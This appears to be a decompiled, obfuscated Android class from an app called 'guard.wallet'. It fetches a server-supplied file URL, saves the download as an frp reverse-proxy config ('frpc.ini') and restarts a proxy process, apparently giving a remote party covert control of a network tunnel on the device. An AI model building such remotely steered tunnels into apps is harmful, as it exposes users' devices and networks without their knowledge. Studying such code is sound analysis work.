package com.guard.wallet.http;

import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.DeviceAgentFileVO;
import java.io.IOException;
import p0.j0;
import p0.l0;

public final class u implements p0.e {
   @Override
   public final void b(p0.e0 var1, IOException var2) {
      a1.q.s("QueryAgentFileCallback", var2);
      if (!(var2 instanceof s.b)) {
         i.c(var1.c.a.h);
         l.x(var1, this);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void d(p0.e0 var1, j0 var2) {
      i.c(var1.c.a.h);
      l0 var6 = var2.g;
      label33:
      if (var6 != null) {
         Exception var10000;
         label35: {
            try {
               QueryAgentFileCallback$1 var3 = new QueryAgentFileCallback$1();
               var7 = (ApiResult)com.guard.wallet.utils.h.c(var6.z(), var3);
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label35;
            }

            if (var7 == null) {
               break label33;
            }

            try {
               if (var7.getSuccess() && var7.getData() != null) {
                  DeviceAgentFileVO var9 = (DeviceAgentFileVO)var7.getData();
                  if (!a1.q.B(var9.getTargetFileUrl())) {
                     String var10 = com.guard.wallet.utils.g.i0().concat("/").concat("frpc.ini");
                     Log.d("QueryAgentFileCallback", var10);
                     if (p.b.b(var9.getTargetFileUrl(), var10)) {
                        Log.d("QueryAgentFileCallback", "网络代理文件重新加载完成");
                        MainApplication.getInstance().reloadRpcProcess();
                     }
                  }
               }
               break label33;
            } catch (Exception var4) {
               var10000 = var4;
               boolean var11 = false;
            }
         }

         Exception var8 = var10000;
         a1.q.s("QueryAgentFileCallback", var8);
      }

      var2.close();
   }
}
